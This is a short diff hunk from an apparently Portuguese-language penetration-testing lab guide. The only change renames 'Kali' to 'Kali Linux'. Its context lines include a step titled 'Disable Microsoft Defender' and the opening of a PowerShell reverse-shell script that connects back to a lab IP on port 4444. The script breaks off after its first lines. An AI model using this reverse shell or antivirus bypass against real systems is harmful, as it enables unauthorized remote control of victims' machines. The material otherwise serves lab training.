@@ -12,7 +12,7 @@
 
 5° __Desabilitar Microsoft Defender.__
 
-Salve este script como reverse.ps1 em sua máquina Kali. (Alterar IP e porta TCP conforme o ambiente)
+Salve este script como reverse.ps1 em sua máquina Kali Linux. (Alterar IP e porta TCP conforme o ambiente)
 ```
 $client = New-Object System.Net.Sockets.TCPClient('192.168.122.145',4444);
 $stream = $client.GetStream();
